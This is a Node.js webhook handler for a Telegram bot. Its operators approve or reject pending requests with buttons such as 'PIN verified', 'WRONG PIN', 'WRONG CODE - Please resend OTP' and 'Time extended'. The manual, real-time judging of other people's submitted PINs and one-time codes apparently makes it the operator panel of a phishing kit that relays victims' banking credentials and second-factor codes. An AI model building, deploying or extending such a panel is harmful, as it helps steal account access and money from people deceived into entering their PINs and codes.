const { sendMessage, editMessageText, answerCallbackQuery } = require('../lib/telegram');
const { addUser, removeUser, listUsers, isUser } = require('../lib/store');
const { get: getApproval, save: saveApproval, extend: extendApproval } = require('../lib/approvals');

const HELP = [
  'Admin commands:',
  '/add #<chat_id> - allow a user',
  '/remove #<chat_id> - remove a user',
  '/list - show allowed users',
].join('\n');

const CHAT_ID = /^\/(?:add|remove)(?:@\w+)?\s+#?(-?\d{3,20})$/;

async function handleCallback(update, token, adminId) {
  const cq = update.callback_query;
  if (!cq || !cq.data) return;

  const senderId = String(cq.from.id);
  const allowed = senderId === adminId || (await isUser(senderId).catch(() => false));

  if (!allowed) {
    await answerCallbackQuery(token, cq.id).catch(() => null);
    return;
  }

  const m = /^a:([a-f0-9]{10}):(\w+)$/.exec(cq.data);
  if (!m) {
    await answerCallbackQuery(token, cq.id).catch(() => null);
    return;
  }

  const [, approvalId, action] = m;
  const rec = await getApproval(approvalId).catch(() => null);

  if (!rec) {
    await answerCallbackQuery(token, cq.id, 'Request expired').catch(() => null);
    return;
  }

  if (rec.status !== 'pending') {
    await answerCallbackQuery(token, cq.id, 'Already handled').catch(() => null);
    return;
  }

  const actionMap = {
    pinok: { status: 'approved', action: 'pin_ok', note: '✅ APPROVED - User can proceed', final: true },
    bothok: { status: 'approved', action: 'both_ok', note: '✅ APPROVED - User can proceed', final: true },
    pinbad: { status: 'denied', action: 'pin_bad', note: '❌ WRONG PIN', final: true },
    otpbad: { status: 'denied', action: 'otp_bad', note: '❌ WRONG CODE - Please resend OTP', final: true },
    resend: { status: 'pending', action: 'resend_otp', note: '📨 OTP resent', final: false },
    extend: { status: 'pending', action: 'extended', note: '', extend: true },
  };

  const act = actionMap[action];
  if (!act) {
    await answerCallbackQuery(token, cq.id).catch(() => null);
    return;
  }

  rec.status = act.status;
  rec.action = act.action;

  const toastMap = {
    pinok: 'PIN verified',
    bothok: 'PIN & OTP verified',
    pinbad: 'PIN incorrect',
    otpbad: 'OTP incorrect',
    resend: 'OTP resent',
    extend: 'Extended by 5 minutes',
  };

  try {
    if (act.extend) {
      const newExpiry = extendApproval(rec, 5 * 60 * 1000);
      const hm = new Date(newExpiry).toLocaleTimeString('en-GB', { hour: '2-digit', minute: '2-digit', hour12: false });
      act.note = `⏱ Time extended to ${hm}`;
    }

    await saveApproval(rec);

    if (cq.message && cq.message.chat) {
      const editOpts = {};
      let editText = `<b>Actions:</b>\n\n${act.note}`;

      if (act.final) {
        editOpts.reply_markup = { inline_keyboard: [] };
      }

      await editMessageText(token, cq.message.chat.id, cq.message.message_id, editText, {
        parse_mode: 'HTML',
        ...editOpts,
      }).catch(() => null);
    }

    await answerCallbackQuery(token, cq.id, toastMap[action] || 'Done').catch(() => null);
  } catch (err) {
    console.error('Callback handling error:', err);
    await answerCallbackQuery(token, cq.id, 'Error').catch(() => null);
  }
}

module.exports = async (req, res) => {
  if (req.method !== 'POST') {
    res.setHeader('Allow', 'POST');
    return res.status(405).end();
  }

  const webhookSecret = process.env.TELEGRAM_WEBHOOK_SECRET;
  if (webhookSecret && req.headers['x-telegram-bot-api-secret-token'] !== webhookSecret) {
    return res.status(401).end();
  }

  const update = req.body || {};
  const message = update.message || update.edited_message;
  const token = process.env.TELEGRAM_TOKEN;
  const adminId = String(process.env.SUPER_ADMIN_CHAT_ID || process.env.TELEGRAM_CHAT_ID || '');

  if (update.callback_query && token && adminId) {
    await handleCallback(update, token, adminId);
    return res.status(200).json({ ok: true });
  }

  const replies = [];

  if (message && typeof message.text === 'string' && token && adminId) {
    const senderId = String(message.chat.id);
    const text = message.text.trim();

    if (senderId === adminId) {
      const match = CHAT_ID.exec(text);

      if (match && text.startsWith('/add')) {
        const added = await addUser(match[1]).catch(() => null);
        replies.push([senderId, added === null ? 'Storage unavailable' : added ? `User added: ${match[1]}` : `Already added: ${match[1]}`]);
      } else if (match && text.startsWith('/remove')) {
        const removed = await removeUser(match[1]).catch(() => null);
        replies.push([senderId, removed === null ? 'Storage unavailable' : removed ? `User removed: ${match[1]}` : `Not found: ${match[1]}`]);
      } else if (text === '/list' || /^\/list(?:@\w+)?$/.test(text)) {
        const users = await listUsers().catch(() => null);
        replies.push([senderId, users === null ? 'Storage unavailable' : users.length ? `Users:\n${users.join('\n')}` : 'No users yet']);
      } else if (text.startsWith('/start')) {
        replies.push([senderId, HELP]);
      } else if (text.startsWith('/')) {
        replies.push([senderId, `Unknown command\n\n${HELP}`]);
      }
    } else if (await isUser(senderId).catch(() => false)) {
      if (/^\/start(?:@\w+)?$/.test(text)) {
        replies.push([senderId, 'Bot is working']);
      }
    }
  }

  await Promise.allSettled(replies.map(([chatId, text]) => sendMessage(token, chatId, text)));
  return res.status(200).json({ ok: true, replies: replies.length });
};
